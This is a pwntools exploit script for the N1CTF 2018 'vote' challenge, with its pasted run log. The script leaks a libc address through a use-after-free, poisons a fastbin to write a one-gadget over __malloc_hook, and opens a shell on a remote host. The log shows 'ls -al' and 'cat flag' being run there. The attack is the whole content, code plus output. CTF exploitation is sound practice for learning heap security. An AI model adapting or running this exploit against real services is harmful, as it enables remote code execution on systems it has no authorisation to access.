from pwn import *

LOCAL=0

if LOCAL:
    #0x3f2d6
    #0xd67cf
    #0x3f32a
    r=process('./vote')
    libc=ELF("libc-2.24_64.so")
    gdb.attach(r)
    malloc_diff=-3268136
    one=0x3f2d6
else:
    #0x45216
    #0x4526a
    #0xf0274
    #0xf1117
    #r=process('./vote',env={"LD_PRELOAD": "./libc-2.23.so"})
    #gdb.attach(r)
    host="47.90.103.10" 
    port=6000 
    r = remote(host,port)
    libc=ELF("libc-2.23.so")
    malloc_diff=-3410504
    one=0xf0274


pause()

def create(content,size):
    r.sendline("0")
    r.recvuntil(": ")
    r.sendline(str(size))
    r.recvuntil(": ")
    r.sendline(content)
    r.recvuntil("Action: ")

def show(idx):
    r.sendline("1")
    r.recvuntil(": ")
    r.sendline(str(idx))
    r.recvuntil("count: ")
    leak=r.recvuntil("\n")
    print leak
    leak=int(leak[:-1])
    print hex(leak)
    r.recvuntil("Action: ")
    return leak

def vote(idx):
    r.sendline("2")
    r.recvuntil(": ")
    r.sendline(str(idx))
    r.recvuntil("Action: ")

def cancel(idx):
    r.sendline("4")
    r.recvuntil(": ")
    r.sendline(str(idx))
    r.recvuntil("Action: ")





r.recvuntil("Action: ")
create("AAAAAAAA",0x100)
create("BBBBBBBB",0x50)#32
create("CCCCCCCC",0x100)
create("BBBBBBBB",0x50)#32

cancel(0)
leakk=show(0)
mallocc=leakk+malloc_diff
libc_base=mallocc-libc.symbols['malloc']
print "leaked libc ="+ hex(libc_base)
malloc_hook=libc_base+libc.symbols['__malloc_hook']
print "malloc_hook = "+hex(malloc_hook)
rce=libc_base+one
print "one = "+hex(rce)
#clean heap
cancel(1)
cancel(2)
cancel(3)
#pause()
create("R"*0x100+p64(0x100)+p64(0x71)+p64(malloc_hook-35),0x500) #new 0

#UAF  
cancel(1)
#added to smallbin to bypass checking 
cancel(0)
create("R"*0x100+p64(0x100)+p64(0x71)+p64(malloc_hook-35),0x300) #new 0

create("qqqq",0x50)
create("A"*3+p64(rce)*4,0x50)
print "[+]get shell :)"
r.sendline("0")
sleep(1)
#triger one gadget
r.sendline("4000")
r.sendline("$0")
r.sendline("ls -al")
r.interactive()


# [*] '/root/Desktop/CTF_Game/n1ctf_2018/vote/libc-2.23.so'
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [*] Paused (press any to continue)
# 139870119717752

# 0x7f360ccceb78
# leaked libc =0x7f360c90a000
# malloc_hook = 0x7f360ccceb10
# one = 0x7f360c9fa274
# [+]get shell :)
# [*] Switching to interactive mode
# Please enter the name's size: total 36
# dr-xr-xr-x 2 pwn  pwn   4096 Mar 10 18:38 .
# drwxr-xr-x 3 root root  4096 Mar  8 15:28 ..
# -rw-r--r-- 1 pwn  pwn    220 Mar  8 15:28 .bash_logout
# -rw-r--r-- 1 pwn  pwn   3771 Mar  8 15:28 .bashrc
# -rw-r--r-- 1 pwn  pwn    655 Mar  8 15:28 .profile
# -rw-r--r-- 1 root root    26 Mar  9 11:12 flag
# -rwxr-xr-x 1 root root 10544 Mar  8 15:29 vote
# $ cat flag
# N1CTF{Pr1nTf_2333333333!}
# $  
